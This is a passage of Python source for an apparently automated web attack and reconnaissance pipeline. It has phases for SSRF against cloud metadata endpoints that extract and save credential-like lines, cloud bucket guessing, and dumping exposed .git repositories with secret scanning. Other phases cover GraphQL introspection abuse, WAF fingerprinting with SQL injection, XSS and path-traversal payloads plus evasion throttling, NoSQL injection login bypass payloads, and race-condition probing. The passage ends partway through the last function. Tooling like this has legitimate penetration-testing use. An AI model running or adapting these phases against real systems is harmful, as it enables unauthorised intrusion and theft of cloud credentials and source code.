        ("Azure", "http://100.100.100.200/metadata/instance?api-version=2021-02-01"),
        # Alibaba Cloud / others
        ("AliCloud", "http://100.100.100.200/latest/meta-data/"),
        ("DigitalOcean", "http://169.254.169.254/metadata/v1.json"),
    ]
    for cand in ssrf_candidates[:_PIPELINE_CFG.sample_urls_fuzz]:
        parsed = urllib.parse.urlparse(cand)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for pname in qs:
            # Only test parameters that look like URL/redirect parameters
            if not any(k in pname.lower() for k in ("url", "uri", "path", "dest", "redirect", "target", "site", "host", "domain", "load", "fetch", "proxy", "image", "img")):
                continue
            for cloud_name, meta_url in cloud_targets:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [meta_url]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_ss_extra_headers})
                    meta_status, meta_headers, meta_body = await _async_urlopen(_ss_urlopen, req, timeout=15)
                    meta_text = meta_body.decode("utf-8", errors="ignore")
                    # If we got data back that looks like cloud metadata
                    if meta_status == 200 and len(meta_text) > 20:
                        findings.append(f"[credential-exfil] {cloud_name} via {test_url}")
                        findings.append(f"  status={meta_status} body_length={len(meta_text)}")
                        # Extract sensitive patterns
                        for secret_pattern in ["accesskey", "secretkey", "token", "password", "private_key", "ssh"]:
                            for line in meta_text.splitlines():
                                if secret_pattern in line.lower():
                                    findings.append(f"  [secret] {line[:200]}")
                        # Save full response for evidence
                        meta_out = ensure(outdir / "ssrf_meta_raw" / f"{_safe_name(cloud_name)}_{_safe_name(pname)}.txt")
                        meta_out.write_text(meta_text)
                except Exception:
                    continue
    if not findings:
        findings.append("[result] No cloud metadata exfiltration achieved")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"17b-SSRFMETA: {len(findings)} findings → {out}")
    return {"17B-SSRFMETA": str(_out), "count": len(findings)}


# ────────────────── Phase 18-CLOUD: Cloud Bucket Discovery ───────────────────
_CLOUD_PROVIDERS: List[Dict[str, Any]] = [
    {"name": "AWS", "domain": "s3.amazonaws.com", "fmt": "{bucket}.s3.amazonaws.com"},
    {"name": "GCP", "domain": "storage.googleapis.com", "fmt": "{bucket}.storage.googleapis.com"},
    {"name": "Azure", "domain": "blob.core.windows.net", "fmt": "{bucket}.blob.core.windows.net"},
    {"name": "DO", "domain": "digitaloceanspaces.com", "fmt": "{bucket}.digitaloceanspaces.com"},
]
_CLOUD_BUCKET_KEYWORDS = [
    "backup", "assets", "media", "uploads", "data", "files", "static",
    "cdn", "downloads", "public", "private", "prod", "dev", "staging",
    "test", "logs", "config", "deploy", "bucket", "storage", "backups",
    "archive", "images", "videos", "docs", "resources", "temp",
]


async def phase_18_CLOUD(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"18-CLOUD"}:
        return {}
    _m_out = outdir / "cloud_buckets.txt"
    if _m_out.exists() and not force:
        return {"18-CLOUD": str(_m_out), "count": count_nonblank(_m_out)}
    log("info", "Phase 18-CLOUD: cloud bucket discovery")
    findings: List[str] = []
    _m_urlopen = _get_urlopener()
    seen_buckets: Set[str] = set()
    # Build candidate bucket names from domain + common keywords
    base = domain.split(".")[0] if "." in domain else domain
    candidates: Set[str] = set()
    candidates.add(base)
    candidates.add(domain.replace(".", "-"))
    candidates.add(domain.replace(".", ""))
    for kw in _CLOUD_BUCKET_KEYWORDS:
        candidates.add(f"{base}-{kw}")
        candidates.add(f"{base}{kw}")
        candidates.add(f"{kw}-{base}")
        candidates.add(f"{domain}-{kw}")
    # Trim to configured sample size
    candidate_list = sorted(candidates)[:_PIPELINE_CFG.sample_hosts_cloud * 10]
    # If cloud_enum is available and working, use it as the primary scanner
    if t.has("cloud_enum") and t.verify("cloud_enum", ["--help"]):
        cloud_in = ensure(outdir / "cloud_enum_domains.txt")
        cloud_in.write_text(domain + "\n")
        cloud_out = outdir / "cloud_enum_raw.txt"
        await _run(
            "cloud_enum",
            ["cloud_enum", "-k", domain, "-l", str(cloud_out), "-qq"],
            600, outdir,
        )
        if cloud_out.exists():
            findings.append(f"[cloud_enum] results → {cloud_out}")
    # CloudFox cloud enumeration
    if t.has("cloudfox"):
        cloudfox_outdir = outdir / "cloudfox_results"
        cloudfox_outdir.mkdir(parents=True, exist_ok=True)
        runner = outdir / "logs" / "cloudfox_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"DOMAIN={shlex.quote(domain)}\n"
            f"OUT={shlex.quote(str(cloudfox_outdir))}\n"
            '# Try common AWS profiles; silently skip if no credentials\n'
            'for profile in default dev staging prod; do\n'
            '  cloudfox aws -p "$profile" --output-dir "$OUT" 2>/dev/null || true\n'
            'done\n'
        )
        runner.chmod(0o755)
        await _run("cloudfox", ["bash", str(runner)], 600, outdir)
        reports = list(cloudfox_outdir.glob("**/*.txt"))
        if reports:
            findings.append(f"[cloudfox] {len(reports)} report files → {cloudfox_outdir}")
    # Python-based bucket probing
    async def _probe_bucket(bucket: str) -> List[str]:
        results: List[str] = []
        for provider in _CLOUD_PROVIDERS:
            url = f"http://{provider['fmt'].format(bucket=bucket)}"
            key = f"{provider['name']}:{url}"
            if key in seen_buckets:
                continue
            seen_buckets.add(key)
            try:
                req = urllib.request.Request(url, method="HEAD",
                    headers={"User-Agent": "Mozilla/5.0"})
                bucket_status, _, _ = await _async_urlopen(_m_urlopen, req, timeout=10)
                if bucket_status in (200, 301, 302, 403):
                    results.append(f"[{provider['name']}] {url} (HTTP {bucket_status})")
            except Exception:
                continue
        return results

    probe_results = await asyncio.gather(*[_probe_bucket(c) for c in candidate_list])
    for pr in probe_results:
        findings.extend(pr)
    out = ensure(_m_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"Phase 18-CLOUD: {len(findings)} cloud bucket findings → {out}")
    return {"18-CLOUD": str(out), "count": len(findings)}


# ────────────────── Phase 19-GIT: Git Exposure Scanning ──────────────────────
_GIT_PATHS = [
    "/.git/config",
    "/.git/HEAD",
    "/.gitignore",
    "/.git/",
    "/git/config",
    "/.svn/entries",
]
_GIT_COMMON_REFS = [
    "refs/heads/master",
    "refs/heads/main",
    "refs/heads/dev",
    "refs/heads/develop",
]


async def phase_19_GIT(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"19-GIT"}:
        return {}
    _n_out = outdir / "git_exposure.txt"
    if _n_out.exists() and not force:
        return {"19-GIT": str(_n_out), "count": count_nonblank(_n_out)}
    log("info", "Phase 19-GIT: git exposure scanning")
    findings: List[str] = []
    _n_urlopen = _get_urlopener()
    # Collect targets: HTTP hosts from 04-SCAN or raw resolved hosts
    targets: List[str] = []
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    if hosts_file.exists():
        for h in read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_git]:
            if not h.startswith("http"):
                h = f"https://{h}"
            targets.append(h.rstrip("/"))
    if not targets:
        log("warn", "Phase 19-GIT: no HTTP targets; skipping")
        return {"19-GIT": str(_n_out), "count": 0}
    # Check for exposed .git directories (use no-redirect to avoid false positives)
    _no_redirect_urlopen = _get_no_redirect_urlopener()
    async def _check_git(url: str) -> List[str]:
        results: List[str] = []
        for git_path in _GIT_PATHS:
            test_url = f"{url}{git_path}"
            try:
                req = urllib.request.Request(test_url, method="HEAD",
                    headers={"User-Agent": "Mozilla/5.0"})
                git_status, _, _ = await _async_urlopen(_no_redirect_urlopen, req, timeout=10)
                if git_status == 200:
                    results.append(f"[.git-exposed] {test_url} (HTTP {git_status})")
                    break
            except urllib.error.HTTPError as e:
                if e.code in (200, 301, 302):
                    results.append(f"[.git-exposed] {test_url} (HTTP {e.code})")
                    break
            except Exception:
                continue
        # If .git is exposed, try to download it
        if results and t.has("gitdumper"):
            git_base = url.rstrip("/") + "/.git/"
            dump_dir = outdir / f"git_dump_{safe_suffix(url)}"
            dump_dir.mkdir(parents=True, exist_ok=True)
            await _run(
                f"gitdumper-{_safe_name(url)}",
                ["gitdumper", git_base, str(dump_dir)],
                300, outdir,
            )
            if dump_dir.exists() and list(dump_dir.iterdir()):
                results.append(f"[git-dumped] {git_base} → {dump_dir}")
                # Run trufflehog on the dumped repo
                if t.has("trufflehog"):
                    truffle_out = outdir / f"trufflehog_{safe_suffix(url)}.txt"
                    runner = outdir / "logs" / f"trufflehog_{safe_suffix(url)}.sh"
                    ensure(runner)
                    runner.write_text(
                        "#!/usr/bin/env bash\n"
                        "set -eu\n"
                        f"DIR={shlex.quote(str(dump_dir))}\n"
                        f"OUT={shlex.quote(str(truffle_out))}\n"
                        'trufflehog filesystem "$DIR" --no-verification 2>/dev/null > "$OUT" || true\n'
                    )
                    runner.chmod(0o755)
                    await _run(
                        f"trufflehog-{_safe_name(url)}",
                        ["bash", str(runner)], 600, outdir,
                    )
                    if truffle_out.exists() and read_lines(truffle_out):
                        results.append(f"[trufflehog] secrets found → {truffle_out}")
        return results

    git_results = await asyncio.gather(*[_check_git(t) for t in targets])
    for gr in git_results:
        findings.extend(gr)
    out = ensure(_n_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"Phase 19-GIT: {len(findings)} git exposure findings → {out}")
    return {"19-GIT": str(out), "count": len(findings)}


# ────────────────── Phase 20-GRAPHQL: GraphQL Introspection ──────────────────
_GRAPHQL_ENDPOINTS = [
    "/graphql", "/gql", "/v1/graphql", "/v2/graphql",
    "/api/graphql", "/api/gql", "/graph", "/query",
    "/graphql/", "/gql/", "/explorer", "/graphiql",
    "/v1/gql", "/v2/gql", "/admin/graphql",
]
_GRAPHQL_INTROSPECTION_QUERY = """
{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name description fields { name description type { kind name ofType { kind name } } } } } }"}
"""


async def phase_20_GRAPHQL(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"20-GRAPHQL"}:
        return {}
    _o_out = outdir / "graphql_introspection.txt"
    if _o_out.exists() and not force:
        return {"20-GRAPHQL": str(_o_out), "count": count_nonblank(_o_out)}
    log("info", "Phase 20-GRAPHQL: GraphQL introspection")
    findings: List[str] = []
    _o_urlopen = _get_urlopener()
    # Collect HTTP targets
    targets: List[str] = []
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    if hosts_file.exists():
        for h in read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_graphql]:
            if not h.startswith("http"):
                h = f"https://{h}"
            targets.append(h.rstrip("/"))
    # Normalize all targets to HTTPS to avoid 308 redirects
    targets = [re.sub(r"^http://", "https://", t) for t in targets]
    if not targets:
        log("warn", "Phase 20-GRAPHQL: no HTTP targets; skipping")
        return {"20-GRAPHQL": str(_o_out), "count": 0}
    # inql integration
    if t.has("inql"):
        inql_out = outdir / "inql_results"
        inql_out.mkdir(parents=True, exist_ok=True)
        for tgt in targets:
            for ep in _GRAPHQL_ENDPOINTS:
                url = f"{tgt}{ep}"
                runner = outdir / "logs" / f"inql_{_safe_name(url)}_runner.sh"
                ensure(runner)
                runner.write_text(
                    "#!/usr/bin/env bash\n"
                    "set -eu\n"
                    f"URL={shlex.quote(url)}\n"
                    f"OUT={shlex.quote(str(inql_out))}\n"
                    'inql -t "$URL" -o "$OUT" 2>/dev/null || true\n'
                )
                runner.chmod(0o755)
                await _run(
                    f"inql-{_safe_name(url)}",
                    ["bash", str(runner)],
                    300, outdir,
                )
    # Clairvoyance GraphQL introspection abuse
    if t.has("clairvoyance"):
        clairvoyance_out = outdir / "clairvoyance_results"
        clairvoyance_out.mkdir(parents=True, exist_ok=True)
        for tgt in targets:
            for ep in _GRAPHQL_ENDPOINTS:
                url = f"{tgt}{ep}"
                cv_out = clairvoyance_out / f"{_safe_name(url)}.json"
                runner = outdir / "logs" / f"clairvoyance_{_safe_name(url)}_runner.sh"
                ensure(runner)
                runner.write_text(
                    "#!/usr/bin/env bash\n"
                    "set -eu\n"
                    f"URL={shlex.quote(url)}\n"
                    f"OUT={shlex.quote(str(cv_out))}\n"
                    'clairvoyance "$URL" -o "$OUT" 2>/dev/null || true\n'
                )
                runner.chmod(0o755)
                await _run(
                    f"clairvoyance-{_safe_name(url)}",
                    ["bash", str(runner)],
                    300, outdir,
                )
        cv_reports = list(clairvoyance_out.glob("*.json"))
        if cv_reports:
            findings.append(f"[clairvoyance] {len(cv_reports)} schema reports → {clairvoyance_out}")
    # Graphinder GraphQL endpoint discovery
    if t.has("graphinder"):
        graphinder_out = outdir / "graphinder_results"
        graphinder_out.mkdir(parents=True, exist_ok=True)
        for tgt in targets:
            runner = outdir / "logs" / f"graphinder_{_safe_name(tgt)}_runner.sh"
            out_file = graphinder_out / f"{_safe_name(tgt)}.json"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"TARGET={shlex.quote(tgt)}\n"
                f"OUT={shlex.quote(str(out_file))}\n"
                'graphinder -t "$TARGET" -o "$OUT" 2>/dev/null || true\n'
            )
            runner.chmod(0o755)
            await _run(
                f"graphinder-{_safe_name(tgt)}",
                ["bash", str(runner)],
                300, outdir,
            )
        gi_reports = list(graphinder_out.glob("*.json"))
        if gi_reports:
            findings.append(f"[graphinder] {len(gi_reports)} endpoint reports → {graphinder_out}")
    # Custom introspection probes (no-redirect to avoid following redirects away from the endpoint)
    _gql_no_redirect = _get_no_redirect_urlopener()
    async def _probe_graphql(url: str) -> List[str]:
        results: List[str] = []
        for ep in _GRAPHQL_ENDPOINTS:
            test_url = f"{url}{ep}"
            try:
                req = urllib.request.Request(test_url, method="POST",
                    data=_GRAPHQL_INTROSPECTION_QUERY.encode(),
                    headers={
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0",
                    })
                _, _, gql_body_bytes = await _async_urlopen(_gql_no_redirect, req, timeout=15)
                body = gql_body_bytes.decode("utf-8", errors="ignore")
                if '"data"' in body and '__schema' in body:
                    results.append(f"[introspection-enabled] {test_url}")
                    # Extract schema summary
                    try:
                        data = json.loads(body)
                        schema = data.get("data", {}).get("__schema", {})
                        qtype = schema.get("queryType", {}).get("name", "?")
                        mtype = schema.get("mutationType", {}).get("name", "none")
                        stype = schema.get("subscriptionType", {}).get("name", "none")
                        results.append(f"  query={qtype} mutation={mtype} subscription={stype}")
                        types = schema.get("types", [])
                        field_count = sum(len(t.get("fields") or []) for t in types if isinstance(t, dict))
                        results.append(f"  types={len(types)} fields={field_count}")
                    except json.JSONDecodeError:
                        pass
                    break
            except urllib.error.HTTPError as e:
                try:
                    body_bytes = await asyncio.to_thread(e.read)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    if '"data"' in body and '__schema' in body:
                        results.append(f"[introspection-enabled (error)] {test_url} (HTTP {e.code})")
                        break
                except Exception:
                    pass
            except Exception:
                continue
        return results

    probe_results = await asyncio.gather(*[_probe_graphql(t) for t in targets])
    for pr in probe_results:
        findings.extend(pr)
    out = ensure(_o_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"Phase 20-GRAPHQL: {len(findings)} GraphQL findings → {out}")
    return {"20-GRAPHQL": str(out), "count": len(findings)}


# ────────────────── Phase 21-WAF: WAF Detection ──────────────────────────────
_WAF_SIGNATURES: List[Tuple[str, List[str], List[str]]] = [
    # Each entry: (name, header_substring_list, extra_indicator_list)
    # extra_indicators are checked against BOTH headers and body content, and may
    # be a full header name ("x-barracuda"), a "key: value" pair ("server: cloudflare"),
    # a wildcard ("*cloudflare*"), or a bare header prefix ending with ":" ("x-datapower:").
    ("Cloudflare", ["cf-ray", "__cfduid", "cloudflare"], ["server: cloudflare"]),
    ("Akamai", ["akamai"], ["server: akamai"]),
    ("AWS WAF", ["x-amz-id-2", "x-amz-cf-id", "x-amzn-requestid"], ["x-amzn-trace-id"]),
    ("Cloudfront", ["x-amz-cf-id", "x-amz-cf-pop"], []),
    ("F5 BIG-IP", ["x-application-context", "x-request-uid"], ["server: bigip"]),
    ("Imperva", ["x-iinfo", "incapsula"], ["x-cdn: incapsula"]),
    ("ModSecurity", ["x-powered-by: mod_security"], []),
    ("NetScaler", ["x-ns-server"], ["server: netscaler"]),
    ("Sucuri", ["x-sucuri-id", "x-sucuri-cache"], []),
    ("Barracuda", ["x-barracuda"], ["server: barracuda"]),
    ("Wordfence", ["x-wordfence"], []),
    ("StackPath", ["x-stackpath"], []),
    ("DenyAll", ["session-denial"], []),
    ("Radware", ["x-rtd"], ["x-sl-compstate"]),
    ("Comodo", ["x-cfwaf"], []),
    ("Airlock", ["x-arlock"], []),
    ("Fortinet", ["x-fortigate"], ["server: fortigate"]),
    ("Citrix", ["x-citrix"], []),
]
_WAF_PROBE_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT * FROM users--",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    "${7*7}",
    "{{7*7}}",
    "1; DROP TABLE users",
    "admin' --",
]


async def phase_21_WAF(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"21-WAF"}:
        return {}
    _p_out = outdir / "waf_detection.txt"
    if _p_out.exists() and not force:
        return {"21-WAF": str(_p_out), "count": count_nonblank(_p_out)}
    log("info", "Phase 21-WAF: WAF detection")
    findings: List[str] = []
    _p_urlopen = _get_urlopener()
    # Collect HTTP targets
    targets: List[str] = []
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    if hosts_file.exists():
        for h in read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_waf]:
            if not h.startswith("http"):
                h = f"https://{h}"
            targets.append(h.rstrip("/"))
    if not targets:
        log("warn", "Phase 21-WAF: no HTTP targets; skipping")
        return {"21-WAF": str(_p_out), "count": 0}
    # wafw00f integration
    if t.has("wafw00f") or t.has("wafw00f.py"):
        waf_bin = "wafw00f" if t.has("wafw00f") else "wafw00f.py"
        waf_out = outdir / "wafw00f_results.txt"
        await _run(
            "wafw00f",
            [waf_bin, *[tgt.replace("https://", "").replace("http://", "") for tgt in targets],
             "-o", str(waf_out), "-a"],
            600, outdir,
        )
        if waf_out.exists():
            for ln in read_lines(waf_out):
                findings.append(f"[wafw00f] {ln}")
    # Custom passive WAF detection (check response headers and body)
    async def _passive_waf_check(url: str) -> List[str]:
        results: List[str] = []
        try:
            req = urllib.request.Request(url, method="GET",
                headers={"User-Agent": "Mozilla/5.0"})
            _, resp_hdrs, resp_body = await _async_urlopen(_p_urlopen, req, timeout=10)
            headers_str = " ".join(f"{k}: {v}" for k, v in resp_hdrs.items()).lower()
            body = resp_body.decode("utf-8", errors="ignore").lower()
            for waf_name, header_indicators, extra_indicators in _WAF_SIGNATURES:
                detected = False
                for indicator in header_indicators:
                    if indicator.lower() in headers_str:
                        detected = True
                        break
                if not detected:
                    for indicator in extra_indicators:
                        if indicator.lower() in headers_str or indicator.lower() in body:
                            detected = True
                            break
                if detected:
                    results.append(f"[passive] {waf_name} detected on {url}")
                    break
        except Exception:
            pass
        return results

    # Active WAF detection (send malicious payloads, check block codes)
    async def _active_waf_check(url: str) -> List[str]:
        results: List[str] = []
        for payload in _WAF_PROBE_PAYLOADS:
            try:
                probe_url = f"{url}?q={urllib.parse.quote(payload)}"
                req = urllib.request.Request(probe_url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0"})
                awaf_status, _, awaf_body = await _async_urlopen(_p_urlopen, req, timeout=10)
                body = awaf_body.decode("utf-8", errors="ignore").lower()
                if any(kw in body for kw in ("blocked", "denied", "rejected", "waf", "security")):
                    results.append(f"[active-blocked-content] {url} → waf keyword in response for payload: {payload[:40]}")
                    break
            except urllib.error.HTTPError as e:
                if e.code in (403, 406, 429, 503, 501):
                    results.append(f"[active-blocked] {url} → HTTP {e.code} with payload: {payload[:40]}")
                    break
            except Exception:
                continue
        return results

    passive_results = await asyncio.gather(*[_passive_waf_check(t) for t in targets])
    for pr in passive_results:
        findings.extend(pr)
    active_results = await asyncio.gather(*[_active_waf_check(t) for t in targets])
    for ar in active_results:
        findings.extend(ar)
    if not findings:
        findings.append("[passive] No WAF detected (passive signature analysis)")
    out = ensure(_p_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    # Set global WAF state so downstream phases can adjust behavior
    _PIPELINE_CFG.waf_detected = bool(findings and not any("No WAF detected" in f for f in findings))
    # Calculate evasion throttle: if WAF detected, add delay and randomize
    if _PIPELINE_CFG.waf_detected:
        _PIPELINE_CFG.waf_evasion_throttle = max(_PIPELINE_CFG.delay, 1.0)
        # Add jitter recommendation to findings
        findings.append("[waf-evasion] WAF detected — downstream phases should add delay=1.0+ and randomize User-Agent/headers")
    log("ok", f"Phase 21-WAF: {len(findings)} WAF detection findings → {out}")
    return {"21-WAF": str(out), "count": len(findings)}


# ────────────────── Phase 22-NOSQLI: NoSQL Injection ─────────────────────────
_NOSQLI_PAYLOADS: List[Dict[str, Any]] = [
    {"$gt": ""},
    {"$ne": ""},
    {"$gt": "admin"},
    {"$regex": ".*"},
    {"$where": "1==1"},
    {"$exists": True},
    {"$ne": "nonexistent"},
    {"$in": ["admin", "true"]},
]
_NOSQLI_PARAMS = {"username", "user", "pass", "password", "email", "token", "id", "role", "admin", "name"}


async def phase_22_NOSQLI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"22-NOSQLI"}:
        return {}
    _out = outdir / "nosqli.txt"
    if _out.exists() and not force:
        return {"22-NOSQLI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 22-NOSQLI: NoSQL injection probes")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "22-NOSQLI: no URLs; skipping")
        return {"22-NOSQLI": str(_out), "count": 0}
    findings: List[str] = []
    _n_urlopen = _get_urlopener()
    _n_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u][:_PIPELINE_CFG.sample_urls_nosqli]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in _NOSQLI_PARAMS:
                continue
            for payload in _NOSQLI_PAYLOADS:
                try:
                    await _throttle_rate()
                    test_qs = qs.copy()
                    test_qs[param_name] = [json.dumps(payload)]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers})
                    ns_status, _, ns_body = await _async_urlopen(_n_urlopen, req, timeout=10)
                    body = ns_body.decode("utf-8", errors="ignore").lower()
                    if ns_status in (200, 201) and len(body) > 100:
                        findings.append(f"[nosqli-payload] {test_url} param={param_name} payload={json.dumps(payload)}")
                        break
                except Exception:
                    continue
    # Also probe JSON API endpoints with NoSQL bodies
    api_targets = [u.split("?")[0] for u in all_urls if "/api/" in u.lower()][:_PIPELINE_CFG.sample_urls_nosqli]
    for u in api_targets:
        for payload in _NOSQLI_PAYLOADS:
            try:
                await _throttle_rate()
                body_data = json.dumps({"username": payload, "password": {"$ne": ""}}).encode()
                req = urllib.request.Request(u, data=body_data, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", **_n_extra_headers})
                ns_status, _, ns_body = await _async_urlopen(_n_urlopen, req, timeout=10)
                if ns_status in (200, 201):
                    findings.append(f"[nosqli-json] POST {u} payload={json.dumps(payload)} → HTTP {ns_status}")
            except Exception:
                continue
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"22-NOSQLI: {len(findings)} NoSQL injection probes → {out}")
    return {"22-NOSQLI": str(out), "count": len(findings)}


# ────────────────── Phase 23-RACE: Race Condition Detection ────────────────────
async def phase_23_RACE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"23-RACE"}:
        return {}
    _out = outdir / "race_conditions.txt"
    if _out.exists() and not force:
        return {"23-RACE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 23-RACE: race condition detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "23-RACE: no URLs; skipping")
        return {"23-RACE": str(_out), "count": 0}
    findings: List[str] = []
    _r_urlopen = _get_urlopener()
    _r_extra_headers = _extra_headers_dict()
    _race_sem = asyncio.Semaphore(20)
    # Target state-changing endpoints from 05-HARVEST: POST/PUT/DELETE with financial or quota keywords
    state_change_keywords = ("redeem", "transfer", "purchase", "vote", "checkout", "payment", "order",
                            "withdraw", "deposit", "refund", "cancel", "subscribe", "upgrade", "downgrade",
                            "apply", "claim", "submit", "update", "delete", "remove")
    targets = [u for u in all_urls if any(m in u.split("?")[0].lower() for m in
        ("/api/", "/account", "/user", "/register", "/login", "/password", "/order", "/checkout", "/payment"))][:_PIPELINE_CFG.sample_endpoints_race]
    # Prioritize state-changing endpoints
    state_change_urls = [u for u in all_urls if any(kw in u.lower() for kw in state_change_keywords)]
    if state_change_urls:
        targets = state_change_urls[:_PIPELINE_CFG.sample_endpoints_race]
    if not targets:
        targets = [u for u in all_urls if any(m in u.split("?")[0].lower() for m in
            ("/api/", "/account", "/user", "/register", "/login", "/password", "/order", "/checkout", "/payment"))][:_PIPELINE_CFG.sample_endpoints_race]
    if not targets:
        log("warn", "23-RACE: no state-changing endpoints found; skipping")
        return {"23-RACE": str(_out), "count": 0}
    async def _race_test(url: str) -> List[str]:
        results: List[str] = []
        responses: List[int] = []
        body_lens: List[int] = []
        async def _concurrent_req() -> None:
            async with _race_sem:
                try:
                    req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
                    s, _, b = await _async_urlopen(_r_urlopen, req, timeout=10)
                    responses.append(s)
                    body_lens.append(len(b))
                except Exception:
                    responses.append(0)
                    body_lens.append(0)
        coros = [_concurrent_req() for _ in range(5)]
        await asyncio.gather(*coros)
        unique_st = len(set(responses))
        unique_len = len(set(body_lens))
        if unique_st > 1 or (unique_len > 1 and max(body_lens) - min(body_lens) > 200):
            results.append(f"[race-candidate] {url} statuses={set(responses)} lengths={set(body_lens)}")
        return results
    race_results = await asyncio.gather(*[_race_test(t) for t in targets])
    for rr in race_results:
        findings.extend(rr)
    # Multi-step TOCTOU: fire read+together concurrently
    async def _toctou_test(url: str) -> List[str]:
        results: List[str] = []
        try:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not qs:
                return results
            first_param = next(iter(qs))
            orig_val = qs[first_param][0]
            test_val = orig_val + "_race_test"
            write_qs = qs.copy()
            write_qs[first_param] = [test_val]
            write_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(write_qs, doseq=True)))
            read_qs = qs.copy()
            read_qs[first_param] = [orig_val]
            read_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(read_qs, doseq=True)))
            async def _write_first() -> None:
                async with _race_sem:
                    try:
                        w_req = urllib.request.Request(write_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
                        await _async_urlopen(_r_urlopen, w_req, timeout=10)
                    except Exception:
                        pass
            async def _read_first() -> Tuple[Optional[int], int]:
                async with _race_sem:
                    try:
                        r_req = urllib.request.Request(read_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
                        rs, _, rb = await _async_urlopen(_r_urlopen, r_req, timeout=10)
                        return rs, len(rb)
                    except Exception:
                        return None, 0
            write_task = asyncio.create_task(_write_first())
            read_tasks = [_read_first() for _ in range(3)]
            read_results = await asyncio.gather(*read_tasks)
            await write_task
            statuses = {r[0] for r in read_results if r[0] is not None}
            lengths = {r[1] for r in read_results}
            if len(statuses) > 1 or (len(lengths) > 1 and max(lengths) - min(lengths) > 200):
                results.append(f"[toctou-candidate] {url} concurrent write+read statuses={statuses} lengths={lengths}")
        except Exception:
            pass
        return results
    toctou_results = await asyncio.gather(*[_toctou_test(t) for t in targets[:_PIPELINE_CFG.sample_endpoints_race // 2]])
    for tr in toctou_results:
        findings.extend(tr)
    if not findings:
        findings.append("[race] No race condition candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
